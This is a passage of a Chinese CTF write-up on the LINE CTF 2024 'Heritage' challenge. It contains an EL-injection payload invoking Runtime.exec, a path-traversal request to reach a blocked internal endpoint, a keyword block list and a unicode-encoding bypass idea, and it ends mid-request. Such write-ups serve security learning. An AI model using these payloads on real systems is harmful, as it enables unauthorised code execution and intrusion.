+</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">return</span> <span style="color:#e06c75">Flux</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">just</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">buffer</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#56b6c2">};</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">return</span> <span style="color:#e06c75">chain</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">filter</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">exchange</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">mutate</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">request</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">mutatedRequest</span><span style="color:#56b6c2">).</span><span style="color:#e06c75">build</span><span style="color:#56b6c2">());</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">})</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">chain</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">filter</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">exchange</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#e5c07b">boolean</span> <span style="color:#61afef;font-weight:bold">isAttackString</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span> <span style="color:#e06c75">queryParams</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e06c75">ATTACK_PATTERNS</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">stream</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">anyMatch</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">pattern</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">-&gt;</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">matcher</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">queryParams</span><span style="color:#56b6c2">).</span><span style="color:#e06c75">find</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">});</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p><code>securityFilter</code> 是核心类，其主要目的就是限制请求 <code>/api/internal</code> 路径以及过滤危险的请求内容，比如 <code>runtime</code>、<code>processbuilder</code>、<code>scriptenginemanager</code> 等。同时如果要以 <code>POST</code> 请求资源，<code>Content-Type</code> 需要设置成 <code>application/json</code>。</p>
+<p><strong>Heritage-app.jar</strong></p>
+<p><strong>InternalController</strong></p>
+<p>唯一存在可控点的 <code>Controller</code> ，明着让你访问 <code>/api/internal/</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#61afef">@RestController</span>
+</span></span><span style="display:flex;"><span><span style="color:#61afef">@RequestMapping</span><span style="color:#56b6c2">({</span><span style="color:#98c379">&#34;/api/internal&#34;</span><span style="color:#56b6c2">})</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">InternalController</span> <span style="color:#c678dd">extends</span> <span style="color:#e06c75">BaseController</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">final</span> <span style="color:#e06c75">Logger</span> <span style="color:#e06c75">log</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">LoggerFactory</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getLogger</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">InternalController</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#61afef;font-weight:bold">InternalController</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#61afef">@PostMapping</span><span style="color:#56b6c2">({</span><span style="color:#98c379">&#34;/&#34;</span><span style="color:#56b6c2">})</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#e06c75">String</span> <span style="color:#61afef;font-weight:bold">index</span><span style="color:#56b6c2">(</span><span style="color:#61afef">@ValidateName</span> <span style="color:#61afef">@RequestBody</span> <span style="color:#e06c75">RequestDto</span> <span style="color:#e06c75">name</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">log</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">info</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;{} is here !&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">name</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#98c379">&#34;Welcome &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">name</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;!&#34;</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p>翻了一下 <code>log4j</code> 的版本，好家伙 <code>2.13.2</code>，所以一开始我想打一下 <code>log4j2 jndi</code> 来着</p>
+<p><img src="/p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323222331747.png"
+	width="1128"
+	height="211"
+	srcset="/p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323222331747_hu4112525d82f9e59d6ad7396efb4874cc_54777_480x0_resize_box_3.png 480w, /p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323222331747_hu4112525d82f9e59d6ad7396efb4874cc_54777_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240323222331747"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="534"
+		data-flex-basis="1283px"
+	
+></p>
+<p>不过后来注意到这里定义了一个 <code>Annotation</code>类</p>
+<p><strong>ValidateName</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#61afef">@Target</span><span style="color:#56b6c2">({</span><span style="color:#e06c75">ElementType</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">FIELD</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ElementType</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">PARAMETER</span><span style="color:#56b6c2">})</span>
+</span></span><span style="display:flex;"><span><span style="color:#61afef">@Retention</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">RetentionPolicy</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">RUNTIME</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#61afef">@Documented</span>
+</span></span><span style="display:flex;"><span><span style="color:#61afef">@Constraint</span><span style="color:#56b6c2">(</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">validatedBy</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">{</span><span style="color:#e06c75">NameValidator</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#61afef">@interface</span> <span style="color:#e06c75">ValidateName</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">String</span> <span style="color:#61afef;font-weight:bold">message</span><span style="color:#56b6c2">()</span> <span style="color:#c678dd">default</span> <span style="color:#98c379">&#34;Invalid name&#34;</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;[]</span> <span style="color:#e06c75">groups</span><span style="color:#56b6c2">()</span> <span style="color:#c678dd">default</span> <span style="color:#56b6c2">{};</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?</span> <span style="color:#c678dd">extends</span> <span style="color:#e06c75">Payload</span><span style="color:#56b6c2">&gt;[]</span> <span style="color:#61afef;font-weight:bold">payload</span><span style="color:#56b6c2">()</span> <span style="color:#c678dd">default</span> <span style="color:#56b6c2">{};</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p><strong>NameValidator</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">NameValidator</span> <span style="color:#c678dd">implements</span> <span style="color:#e06c75">ConstraintValidator</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">ValidateName</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">String</span><span style="color:#56b6c2">&gt;</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">final</span> <span style="color:#e06c75">String</span> <span style="color:#e06c75">REGEX_NAME</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;^[a-f\\d]{32}$&#34;</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">final</span> <span style="color:#e06c75">Pattern</span> <span style="color:#e06c75">PATTERN</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;^[a-f\\d]{32}$&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#61afef;font-weight:bold">NameValidator</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#e5c07b">boolean</span> <span style="color:#61afef;font-weight:bold">isValid</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ConstraintValidatorContext</span> <span style="color:#e06c75">context</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(!</span><span style="color:#e06c75">StringUtils</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isEmpty</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">value</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">!</span><span style="color:#e06c75">PATTERN</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">matcher</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">value</span><span style="color:#56b6c2">).</span><span style="color:#e06c75">matches</span><span style="color:#56b6c2">())</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">context</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">buildConstraintViolationWithTemplate</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">format</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;%s&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">)).</span><span style="color:#e06c75">addConstraintViolation</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e5c07b">false</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e5c07b">true</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p>限制了 <code>name</code> 只能为32位的字母数字组合</p>
+<p><img src="/p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323224554256.png"
+	width="1088"
+	height="324"
+	srcset="/p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323224554256_huaa65efe80a624edb7e8d6b0add05919e_28750_480x0_resize_box_3.png 480w, /p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323224554256_huaa65efe80a624edb7e8d6b0add05919e_28750_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240323224554256"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="335"
+		data-flex-basis="805px"
+	
+></p>
+<p>试着将 <code>name</code> 设置为 <code>${java:versoin}</code>，不出意外的报错了</p>
+<p><img src="/p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323224756016.png"
+	width="1142"
+	height="370"
+	srcset="/p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323224756016_hu37a27c9a3ba77ccb0ef88485157392a4_39530_480x0_resize_box_3.png 480w, /p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323224756016_hu37a27c9a3ba77ccb0ef88485157392a4_39530_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240323224756016"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="308"
+		data-flex-basis="740px"
+	
+></p>
+<p>不过眼尖的我在报错中发现了这样一行信息</p>
+<p><img src="/p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323224938398.png"
+	width="1597"
+	height="310"
+	srcset="/p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323224938398_hu0ce90b7c3abf71a8bfe4fec88e554a39_129261_480x0_resize_box_3.png 480w, /p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323224938398_hu0ce90b7c3abf71a8bfe4fec88e554a39_129261_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240323224938398"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="515"
+		data-flex-basis="1236px"
+	
+></p>
+<p>ELExpression？盲猜 context.buildConstraintViolationWithTemplate 可执行EL表达式</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#e5c07b">boolean</span> <span style="color:#61afef;font-weight:bold">isValid</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ConstraintValidatorContext</span> <span style="color:#e06c75">context</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(!</span><span style="color:#e06c75">StringUtils</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isEmpty</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">value</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">!</span><span style="color:#e06c75">PATTERN</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">matcher</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">value</span><span style="color:#56b6c2">).</span><span style="color:#e06c75">matches</span><span style="color:#56b6c2">())</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">context</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">buildConstraintViolationWithTemplate</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">format</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;%s&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">)).</span><span style="color:#e06c75">addConstraintViolation</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e5c07b">false</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e5c07b">true</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p>试着将<code>name</code> 设置成</p>
+<pre tabindex="0"><code>${&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;exec&#39;, &#39;&#39;.class).invoke(&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;).invoke(null), &#39;calc&#39;)}
+</code></pre><p>果然可以</p>
+<p><img src="/p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323225457231.png"
+	width="1150"
+	height="580"
+	srcset="/p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323225457231_hu2264489da1e107b4e6ccd37b50c05f9c_43136_480x0_resize_box_3.png 480w, /p/2024linectfheritage%E9%A2%98%E8%A7%A3/img/image-20240323225457231_hu2264489da1e107b4e6ccd37b50c05f9c_43136_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240323225457231"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="475px"
+	
+></p>
+<p><code>Heritage-app.jar</code> 的部分处理完毕，接着处理 <code>Heritage-gw.jar</code></p>
+<p><strong>SecurityFilter</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">private</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">final</span> <span style="color:#e06c75">List</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">ATTACK_PATTERNS</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Arrays</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">asList</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;&lt;script&gt;(.*?)&lt;/script&gt;&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;src[\r\n]*=[\r\n]*\\&#39;(.*?)\\&#39;&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">42</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;&lt;/script&gt;&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;&lt;script(.*?)&gt;&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">42</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;eval\\((.*?)\\)&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">42</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;expression\\((.*?)\\)&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">42</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;javascript:&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;vbscript:&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;onload(.*?)=&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">42</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;include\\s+(.*?)&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">42</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;require\\s+(.*?)&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">42</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;support&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;runtime&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;processbuilder&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;scriptenginemanager&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;eval&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;exec&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;yaml&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;tostring&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;character&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;substr&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;getmethods&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;invoke&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;\\.\\./&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;\\.\\.\\\\&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;%2e&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;%2f&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;/[^/]*/internal/&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">));</span>
+</span></span></code></pre></div><p><code>SecurityFilter</code> 设置了很多的匹配规则，特别是限制访问 <code>/[^/]*/internal/</code></p>
+<p>这该怎么访问 /api/internal 呢？好在队里大佬给出了解决方法，学习了学习了</p>
+<pre tabindex="0"><code>POST /api/external/..;/%69%6e%74%65%72%6e%61%6c/ HTTP/1.1
+Host: 35.200.117.55:20080
+Content-Type: application/json
+Content-Length: 43
+
+{&#34;name&#34;:&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;}
+</code></pre><p>接着处理黑名单的问题，特别影响命令执行的关键词大致如下</p>
+<pre tabindex="0"><code>eval
+expression
+javascript
+support
+runtime
+scriptenginemanager
+eval
+exec
+yaml
+getmethods
+invoke
+</code></pre><p>不过没啥用，EL表达式可以用 <code>unicode</code> 编码绕过</p>
+<pre tabindex="0"><code>POST /api/internal/ HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/json
+Content-Length: 1010
+
